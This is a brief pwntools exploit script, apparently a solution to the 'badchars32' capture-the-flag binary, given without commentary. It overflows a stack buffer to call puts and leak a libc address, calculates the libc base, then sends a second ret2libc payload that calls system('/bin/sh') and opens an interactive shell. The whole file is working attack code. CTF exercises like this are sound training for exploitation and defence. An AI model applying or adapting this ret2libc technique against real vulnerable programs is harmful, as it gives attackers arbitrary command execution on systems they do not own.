from pwn import * 
context.log_level="debug"
p=process("./badchars32")
p.readuntil("\n> ")
puts=0x80484d0
pr=0x08048897
libc=ELF('/lib/i386-linux-gnu/libc.so.6')
payload="D"*0x2c+p32(puts)+p32(pr)+p32(0x804a00c)+p32(0x80486B6)
p.send(payload.ljust(0x200,'\0'))
data=p.read(4)
base=u32(data)-libc.symbols['printf']
log.warning(hex(base))
libc.address=base
payload="D"*0x2b+p32(libc.symbols['system'])+p32(0xdeadbeef)+p32(libc.search("/bin/sh").next())
p.readuntil("\n> ")
p.send(payload.ljust(0x200,'\0'))
p.interactive()
